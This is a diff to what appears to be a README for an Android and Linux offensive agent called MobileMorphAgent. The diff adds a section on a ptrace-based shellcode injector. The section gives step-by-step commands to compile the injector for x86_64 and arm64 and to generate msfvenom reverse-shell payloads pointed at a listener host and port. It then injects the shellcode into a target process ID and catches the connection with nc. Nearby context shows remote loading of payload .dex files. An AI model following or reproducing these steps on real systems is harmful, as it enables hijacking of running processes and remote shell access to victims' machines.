@@ -142,6 +142,52 @@ The agent will receive the command and invoke:
 DexLoader.loadandExecute(context, "/sdcard/MobileMorphAgent/payloads/test_payload.dex");
 ```
 
+---
+
+## Native Injection Usage (`injector.c`)
+
+`injector.c` enables low-level shellcode injection into running processes using `ptrace`. It supports both `x86_64` and `arm64` architectures.
+
+### Build the Injector
+
+```bash
+# x86_64 (Linux)
+gcc injector/injector.c -o injector/injector
+
+# ARM64 (Android target using NDK or Termux)
+aarch64-linux-android-gcc injector/injector.c -o injector/injector
+```
+
+### Generate Shellcode Payload
+Use `msfvenom` to create a reverse shell payload:
+
+```bash
+# x86_64 (Linux)
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.2 LPORT=4444 -f raw -o reverse_shell.bin
+
+# ARM64 (Android target using NDK or Termux)
+msfvenom -p linux/aarch64/shell_reverse_tcp LHOST=10.0.2.2 LPORT=4444 -f raw -o reverse_shell.bin
+```
+
+### Inject the Shellcode
+```bash
+# Replace <PID> with the target process ID (e.g., from `ps`)
+./injector/injector <PID> reverse_shell.bin
+```
+- This injector will:
+  1. Attach to the target process
+  2. Use remote `mmap()` to allocate memory
+  3. Write the shellcode
+  4. Redirect the PC to execute the payload
+
+### Start the Listener
+Set up your reverse shell listener before injection:
+```bash
+# x86_64 (Linux)
+nc -lnvp 4444
+```
+Once the shellcode executes, it will connect back to your terminal.
+
 ...
 
 ## 👥 Credits
